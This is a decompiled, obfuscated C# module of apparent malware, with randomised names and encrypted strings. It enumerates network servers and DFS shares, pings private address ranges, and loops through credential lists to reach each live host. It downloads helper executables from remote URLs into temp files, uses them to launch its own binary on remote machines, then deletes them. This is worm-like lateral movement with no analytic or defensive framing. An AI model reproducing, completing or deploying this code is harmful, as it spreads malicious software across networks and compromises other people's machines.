using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

internal sealed class jKhaBUDozW
{
	public sealed class UGqNqOyXTy
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum eNkidzIBKP
	{
		rpeUKvwATkUKdo = 1,
		nsjGcORnxPdN,
		FAikWXqOzNj,
		lKnWiFjwxl,
		TxwLqPmplbod
	}

	public enum YnCNmGlriOhl
	{
		klTBhADdrc,
		KKwCzRqydaP,
		mYsyJhtCCNV,
		SiJsppueAfNp
	}

	public enum nBFvnIFGsbUwCm
	{
		khAYWUpLKZpuk = 1,
		PkYpLIzMWYNu = 2,
		hHDlYBZBHPIj = 4,
		TDPgvqVmeI = 8,
		OIpvVGzMPUqSYZ = 16,
		TOGesXsmHNOK = 19
	}

	public enum ngluCrgyjdP
	{
		zOVQeevsEvLC,
		JXfCKPloYpuNW,
		xmjqwQunaTpk,
		DTkphlJVoF,
		eIFBDBNOPnIY,
		xIqRdnOCaxtH,
		mhDAWryqyXQ,
		RbsizCAzbxpB,
		xMXchABJJCaydv,
		BubAbheRsfFu,
		UCZUYNVOadA,
		WqpyUbDCqpty
	}

	public sealed class CbxpfJYjMuwfcnj : IEnumerable
	{
		private enum QKmfBIVZeNsGQymTw
		{
			dQJNVeUPzcSsV = 0,
			IlopmDvuZVYs = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class YMmVRTZxUMBLtn
		{
			public eNkidzIBKP XtAGSVChyRaWZ;

			public YnCNmGlriOhl MURkSZTZXwLPTI;

			public ngluCrgyjdP qCvfvQYlcOgcxly;

			public nBFvnIFGsbUwCm vlYcpYJxrgPHz;

			public string NvMnxZfLApj;

			public string hJszkCQVhbM;

			public string wKyaDtnwYWaEArfq;

			public string INNGtmIvtMIPmkj;
		}

		private ArrayList TEZappWGDbOj = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern QKmfBIVZeNsGQymTw WNetOpenEnumA(eNkidzIBKP dwScope, YnCNmGlriOhl dwType, nBFvnIFGsbUwCm dwUsage, YMmVRTZxUMBLtn p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern QKmfBIVZeNsGQymTw WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern QKmfBIVZeNsGQymTw WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(YMmVRTZxUMBLtn ymmVRTZxUMBLtn_0, eNkidzIBKP eNkidzIBKP_0, YnCNmGlriOhl ynCNmGlriOhl_0, nBFvnIFGsbUwCm nBFvnIFGsbUwCm_0, ngluCrgyjdP ngluCrgyjdP_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(eNkidzIBKP_0, ynCNmGlriOhl_0, nBFvnIFGsbUwCm_0, ymmVRTZxUMBLtn_0, out lphEnum) == QKmfBIVZeNsGQymTw.dQJNVeUPzcSsV)
			{
				QKmfBIVZeNsGQymTw qKmfBIVZeNsGQymTw;
				do
				{
					qKmfBIVZeNsGQymTw = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (qKmfBIVZeNsGQymTw)
					{
					case QKmfBIVZeNsGQymTw.IlopmDvuZVYs:
						continue;
					case QKmfBIVZeNsGQymTw.dQJNVeUPzcSsV:
						Marshal.PtrToStructure(intPtr, ymmVRTZxUMBLtn_0);
						if (ymmVRTZxUMBLtn_0.qCvfvQYlcOgcxly == ngluCrgyjdP_0)
						{
							TEZappWGDbOj.Add(ymmVRTZxUMBLtn_0.hJszkCQVhbM);
						}
						if ((ymmVRTZxUMBLtn_0.vlYcpYJxrgPHz & nBFvnIFGsbUwCm.PkYpLIzMWYNu) == nBFvnIFGsbUwCm.PkYpLIzMWYNu)
						{
							EnumerateServers(ymmVRTZxUMBLtn_0, eNkidzIBKP_0, ynCNmGlriOhl_0, nBFvnIFGsbUwCm_0, ngluCrgyjdP_0);
						}
						continue;
					}
					break;
				}
				while (qKmfBIVZeNsGQymTw != QKmfBIVZeNsGQymTw.IlopmDvuZVYs);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public CbxpfJYjMuwfcnj(eNkidzIBKP eNkidzIBKP_0, YnCNmGlriOhl ynCNmGlriOhl_0, nBFvnIFGsbUwCm nBFvnIFGsbUwCm_0, ngluCrgyjdP ngluCrgyjdP_0)
		{
			YMmVRTZxUMBLtn ymmVRTZxUMBLtn_ = new YMmVRTZxUMBLtn();
			EnumerateServers(ymmVRTZxUMBLtn_, eNkidzIBKP_0, ynCNmGlriOhl_0, nBFvnIFGsbUwCm_0, ngluCrgyjdP_0);
		}

		public IEnumerator GetEnumerator()
		{
			return TEZappWGDbOj.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct iFoDoQzUtd
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string BqxLScpVjTe;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string nyCBJjCIdpAhES;

		public uint SHxRPnLaQbYVDdYk;

		public uint PXYrFhQIOElz;

		public IntPtr ajPYKmkmYJoTZGa;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct NekCDfJnPflZIv
	{
		public int SHxRPnLaQbYVDdYk;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string STEbPAOFyLHvN;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string DtHuQQIFNTv;
	}

	public struct MdonhhCHTFyQvQTF
	{
		public string OkfzvqkZxlRy;

		public string[] wnxhyrvIBHbE;

		public MdonhhCHTFyQvQTF(string string_0, string[] string_1)
		{
			OkfzvqkZxlRy = string_0;
			wnxhyrvIBHbE = string_1;
		}
	}

	private sealed class stWdyXJwsqtY
	{
		public string preIfSnProbOuQ;

		public string yZGtGkkIdwXph;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107360203)) && !string_0.StartsWith(getString_0(107360198)) && !string_0.StartsWith(getString_0(107360157)) && !string_0.Contains(getString_0(107361746))) || !bXRoxFkZbLkX(string_0))
			{
				return;
			}
			try
			{
				if (PHGJAOmKtxaSj.UaQMqJBzYvfao == getString_0(107396990))
				{
					for (int i = 0; i < YLdsNrhBpEoDp.Count; i++)
					{
						PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360778), getString_0(107360176) + string_0 + getString_0(107360167) + YLdsNrhBpEoDp[i] + getString_0(107360724) + DHeNlCnNPE[i]);
						Thread.Sleep(1000);
					}
				}
				else
				{
					PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360778), getString_0(107360176) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (PHGJAOmKtxaSj.UaQMqJBzYvfao == getString_0(107396990))
			{
				for (int j = 0; j < YLdsNrhBpEoDp.Count; j++)
				{
					if (PHGJAOmKtxaSj.eJbVLXuVuFTP)
					{
						if (File.Exists(preIfSnProbOuQ))
						{
							PHGJAOmKtxaSj.npwWDLTdKyHek(preIfSnProbOuQ, getString_0(107360181) + string_0 + getString_0(107370804) + YLdsNrhBpEoDp[j] + getString_0(107370827) + DHeNlCnNPE[j] + getString_0(107370786) + Assembly.GetEntryAssembly()!.Location + getString_0(107360208));
						}
					}
					else if (File.Exists(yZGtGkkIdwXph))
					{
						PHGJAOmKtxaSj.npwWDLTdKyHek(yZGtGkkIdwXph, getString_0(107360181) + string_0 + getString_0(107370804) + YLdsNrhBpEoDp[j] + getString_0(107370827) + DHeNlCnNPE[j] + getString_0(107370753) + Assembly.GetEntryAssembly()!.Location + getString_0(107360208));
					}
				}
			}
			else if (PHGJAOmKtxaSj.eJbVLXuVuFTP)
			{
				if (File.Exists(preIfSnProbOuQ))
				{
					PHGJAOmKtxaSj.npwWDLTdKyHek(preIfSnProbOuQ, getString_0(107360181) + string_0 + getString_0(107370728) + Assembly.GetEntryAssembly()!.Location + getString_0(107360208));
				}
			}
			else if (File.Exists(yZGtGkkIdwXph))
			{
				PHGJAOmKtxaSj.npwWDLTdKyHek(yZGtGkkIdwXph, getString_0(107360181) + string_0 + getString_0(107371207) + Assembly.GetEntryAssembly()!.Location + getString_0(107360208));
			}
		}

		static stWdyXJwsqtY()
		{
			Strings.CreateGetStringDelegate(typeof(stWdyXJwsqtY));
		}
	}

	private sealed class SOieiPsCiqwzn
	{
		public string DDEQYQLnolH;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != DDEQYQLnolH;
		}
	}

	public static List<string> AJVSdvTxoVGc;

	public static string joMlSWzdxPdg;

	public static List<string> YLdsNrhBpEoDp;

	public static List<string> DHeNlCnNPE;

	public static List<string> SeDXSYDbXWZT;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<UGqNqOyXTy> uPLimKoRCw()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397265);
			process.StartInfo.Arguments = getString_0(107371306);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<UGqNqOyXTy> list = new List<UGqNqOyXTy>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107371289))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new UGqNqOyXTy
						{
							ServerName = getString_0(107397270) + stringBuilder.ToString() + getString_0(107371244)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string nHRTnQERhFmM, int GYcgYDflFG, int JxaMgYZIhlwMB, out IntPtr xSsfpTCFXvbGvL, [MarshalAs(UnmanagedType.I4)] out int xgEpZzKGKCU, [MarshalAs(UnmanagedType.I4)] ref int WzgUhtUrAG);

	public static List<MdonhhCHTFyQvQTF> eYqYBdCQVhU(string string_0)
	{
		try
		{
			List<MdonhhCHTFyQvQTF> list = new List<MdonhhCHTFyQvQTF>();
			IntPtr xSsfpTCFXvbGvL = default(IntPtr);
			int xgEpZzKGKCU = 0;
			int WzgUhtUrAG = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out xSsfpTCFXvbGvL, out xgEpZzKGKCU, ref WzgUhtUrAG) == 0)
			{
				for (int i = 0; i < xgEpZzKGKCU; i++)
				{
					iFoDoQzUtd iFoDoQzUtd = (iFoDoQzUtd)Marshal.PtrToStructure(xSsfpTCFXvbGvL + i * Marshal.SizeOf(typeof(iFoDoQzUtd)), typeof(iFoDoQzUtd));
					if (iFoDoQzUtd.BqxLScpVjTe == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < iFoDoQzUtd.PXYrFhQIOElz; j++)
					{
						IntPtr ptr = new IntPtr(iFoDoQzUtd.ajPYKmkmYJoTZGa.ToInt64() + j * Marshal.SizeOf(typeof(NekCDfJnPflZIv)));
						NekCDfJnPflZIv nekCDfJnPflZIv = (NekCDfJnPflZIv)Marshal.PtrToStructure(ptr, typeof(NekCDfJnPflZIv));
						if (nekCDfJnPflZIv.SHxRPnLaQbYVDdYk == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107360124),
								nekCDfJnPflZIv.STEbPAOFyLHvN,
								nekCDfJnPflZIv.DtHuQQIFNTv
							}));
						}
					}
					string text = iFoDoQzUtd.BqxLScpVjTe.Replace(string_0, getString_0(107361689));
					if (text.StartsWith(getString_0(107397270)))
					{
						text = text.Substring(1);
					}
					list.Add(new MdonhhCHTFyQvQTF(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void uzRzCtfgxUaAC()
	{
		PHGJAOmKtxaSj.QACRdjtjuvjT(getString_0(107371203));
		List<UGqNqOyXTy> list = uPLimKoRCw();
		List<MdonhhCHTFyQvQTF> list2 = eYqYBdCQVhU(Environment.MachineName);
		if (list2 != null)
		{
			foreach (MdonhhCHTFyQvQTF item in list2)
			{
				string[] wnxhyrvIBHbE = item.wnxhyrvIBHbE;
				foreach (string text in wnxhyrvIBHbE)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (PHGJAOmKtxaSj.UaQMqJBzYvfao == getString_0(107396933))
						{
							for (int j = 0; j < YLdsNrhBpEoDp.Count; j++)
							{
								PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360721), getString_0(107371662) + text + getString_0(107360110) + YLdsNrhBpEoDp[j] + getString_0(107360667) + DHeNlCnNPE[j]);
							}
						}
						else
						{
							PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360721), getString_0(107371662) + text);
						}
						PHGJAOmKtxaSj.cCeOzPFAHxI.Add(text.Replace(getString_0(107359930), getString_0(107361689)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (UGqNqOyXTy item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (PHGJAOmKtxaSj.UaQMqJBzYvfao == getString_0(107396933))
				{
					for (int k = 0; k < YLdsNrhBpEoDp.Count; k++)
					{
						PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360721), getString_0(107371662) + item2.ServerName + getString_0(107360110) + YLdsNrhBpEoDp[k] + getString_0(107360667) + DHeNlCnNPE[k]);
					}
				}
				else
				{
					PHGJAOmKtxaSj.npwWDLTdKyHek(getString_0(107360721), getString_0(107371662) + item2.ServerName);
				}
				PHGJAOmKtxaSj.cCeOzPFAHxI.Add(item2.ServerName.Replace(getString_0(107359930), getString_0(107361689)));
			}
			catch
			{
			}
		}
	}

	public static void rhJrHiewndop()
	{
		stWdyXJwsqtY CS_0024_003C_003E8__locals0 = new stWdyXJwsqtY();
		PHGJAOmKtxaSj.lORXEBvgejIb();
		List<kshgiiEYWKmTRE> list = kshgiiEYWKmTRE.MawneSOmSu();
		foreach (kshgiiEYWKmTRE item in list)
		{
			AJVSdvTxoVGc.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.preIfSnProbOuQ = getString_0(107361689);
		CS_0024_003C_003E8__locals0.yZGtGkkIdwXph = getString_0(107361689);
		try
		{
			CS_0024_003C_003E8__locals0.preIfSnProbOuQ = MjTXqDuDZP();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.yZGtGkkIdwXph = QdYmYZvmovRS();
		}
		catch
		{
		}
		foreach (kshgiiEYWKmTRE item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107360146)) || item2.IPAddress.StartsWith(getString_0(107360141)) || item2.IPAddress.StartsWith(getString_0(107360100)) || item2.IPAddress.Contains(getString_0(107361689)))
				{
					LSAdKsomlZMC.EwzHmCFhlJPp(item2.MacAddress, item2.IPAddress, getString_0(107371621));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(AJVSdvTxoVGc, delegate(string string_0)
			{
				if ((string_0.StartsWith(stWdyXJwsqtY.getString_0(107360203)) || string_0.StartsWith(stWdyXJwsqtY.getString_0(107360198)) || string_0.StartsWith(stWdyXJwsqtY.getString_0(107360157)) || string_0.Contains(stWdyXJwsqtY.getString_0(107361746))) && bXRoxFkZbLkX(string_0))
				{
					try
					{
						if (PHGJAOmKtxaSj.UaQMqJBzYvfao == stWdyXJwsqtY.getString_0(107396990))
						{
							for (int i = 0; i < YLdsNrhBpEoDp.Count; i++)
							{
								PHGJAOmKtxaSj.npwWDLTdKyHek(stWdyXJwsqtY.getString_0(107360778), stWdyXJwsqtY.getString_0(107360176) + string_0 + stWdyXJwsqtY.getString_0(107360167) + YLdsNrhBpEoDp[i] + stWdyXJwsqtY.getString_0(107360724) + DHeNlCnNPE[i]);
								Thread.Sleep(1000);
							}
						}
						else
						{
							PHGJAOmKtxaSj.npwWDLTdKyHek(stWdyXJwsqtY.getString_0(107360778), stWdyXJwsqtY.getString_0(107360176) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (PHGJAOmKtxaSj.UaQMqJBzYvfao == stWdyXJwsqtY.getString_0(107396990))
					{
						for (int j = 0; j < YLdsNrhBpEoDp.Count; j++)
						{
							if (PHGJAOmKtxaSj.eJbVLXuVuFTP)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.preIfSnProbOuQ))
								{
									PHGJAOmKtxaSj.npwWDLTdKyHek(CS_0024_003C_003E8__locals0.preIfSnProbOuQ, stWdyXJwsqtY.getString_0(107360181) + string_0 + stWdyXJwsqtY.getString_0(107370804) + YLdsNrhBpEoDp[j] + stWdyXJwsqtY.getString_0(107370827) + DHeNlCnNPE[j] + stWdyXJwsqtY.getString_0(107370786) + Assembly.GetEntryAssembly()!.Location + stWdyXJwsqtY.getString_0(107360208));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph))
							{
								PHGJAOmKtxaSj.npwWDLTdKyHek(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph, stWdyXJwsqtY.getString_0(107360181) + string_0 + stWdyXJwsqtY.getString_0(107370804) + YLdsNrhBpEoDp[j] + stWdyXJwsqtY.getString_0(107370827) + DHeNlCnNPE[j] + stWdyXJwsqtY.getString_0(107370753) + Assembly.GetEntryAssembly()!.Location + stWdyXJwsqtY.getString_0(107360208));
							}
						}
					}
					else if (PHGJAOmKtxaSj.eJbVLXuVuFTP)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.preIfSnProbOuQ))
						{
							PHGJAOmKtxaSj.npwWDLTdKyHek(CS_0024_003C_003E8__locals0.preIfSnProbOuQ, stWdyXJwsqtY.getString_0(107360181) + string_0 + stWdyXJwsqtY.getString_0(107370728) + Assembly.GetEntryAssembly()!.Location + stWdyXJwsqtY.getString_0(107360208));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph))
					{
						PHGJAOmKtxaSj.npwWDLTdKyHek(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph, stWdyXJwsqtY.getString_0(107360181) + string_0 + stWdyXJwsqtY.getString_0(107371207) + Assembly.GetEntryAssembly()!.Location + stWdyXJwsqtY.getString_0(107360208));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.preIfSnProbOuQ))
			{
				File.Delete(CS_0024_003C_003E8__locals0.preIfSnProbOuQ);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph))
			{
				File.Delete(CS_0024_003C_003E8__locals0.yZGtGkkIdwXph);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string MjTXqDuDZP()
	{
		if (IntPtr.Size == 8)
		{
			return LGEgdTOqJHzpOQ(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371632))));
		}
		return LGEgdTOqJHzpOQ(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371632))));
	}

	public static string QdYmYZvmovRS()
	{
		if (IntPtr.Size == 8)
		{
			return LGEgdTOqJHzpOQ(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371519))));
		}
		return LGEgdTOqJHzpOQ(new Uri(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371474))));
	}

	public static bool bXRoxFkZbLkX(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string LGEgdTOqJHzpOQ(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107370857), getString_0(107361689)).Remove(0, 3) + getString_0(107370852);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> kCytuMscUFKv()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107370843));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107370778)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107370797));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				SOieiPsCiqwzn CS_0024_003C_003E8__locals0 = new SOieiPsCiqwzn();
				CS_0024_003C_003E8__locals0.DDEQYQLnolH = array4[j];
				if (CS_0024_003C_003E8__locals0.DDEQYQLnolH.Contains(getString_0(107370752)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.DDEQYQLnolH).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static jKhaBUDozW()
	{
		Strings.CreateGetStringDelegate(typeof(jKhaBUDozW));
		AJVSdvTxoVGc = new List<string>();
		joMlSWzdxPdg = getString_0(107361689);
		YLdsNrhBpEoDp = new List<string>();
		DHeNlCnNPE = new List<string>();
		SeDXSYDbXWZT = new List<string>();
	}
}
